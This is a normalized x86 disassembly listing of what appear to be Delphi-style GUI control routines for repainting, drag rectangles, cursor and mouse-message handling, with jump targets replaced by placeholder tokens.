mov [ fs : eax ] edx
push sub_43a6fd
lea eax [ ebp - 0xc ]
call sub_403e54
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
sub_43a708
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_413dc8
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_413d6c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_439cec
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a794
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440e2c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_439cec
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440b28
push eax
call InvalidateRect
push ebp
call sub_43a708
pop ecx
test al al
je r-xdata
mov al 0x1
sub_43a830
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4514e0
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_43b4f4
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403300
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440e2c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440b28
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_43a961
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43e934
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_440b28
push eax
call ReleaseDC
retn
sub_43a9e8
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax edi
call sub_43b528
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_439e90
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406840
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43b4f4
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43869c
sub_43aabc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43aaf8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43ab44
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43ab70
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43a2f0
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43a2dc
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402910
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402910
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_440b28
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43ac54
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43aca0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403300
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403300
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43ad64
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43adb0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43adfc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43af17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41d428
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43af1e
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43af50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403290
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_439e90
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403300
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403300
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403300
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403300
jmp r-xdata
sub_43b040
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412910
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43b528
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43a2dc
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43a2f0
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412960
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43b220
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_439e64
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403300
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_440b28
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_437a60
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43b20b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_440b28
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_440b28
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_439cec
test esi esi
je r-xdata
sub_43b220
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403300
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43c0a4
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403300
mov eax esi
call sub_439d94
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_439d50
mov ecx eax
xor edx edx
xor eax eax
call sub_412938
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403300
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43b2c4
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43b2f4
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43b360
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43b420
sub_43b390
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43b3c0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_439e90
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43b3ec
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43b420
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43b4f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43b528
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43b5c0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_4514e0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_4514e0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_439eec
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45ac8c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403300
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_451424
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403300
jmp r-xdata
sub_43b754
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408724
mov edi eax
mov eax [ esi + 0x64 ]
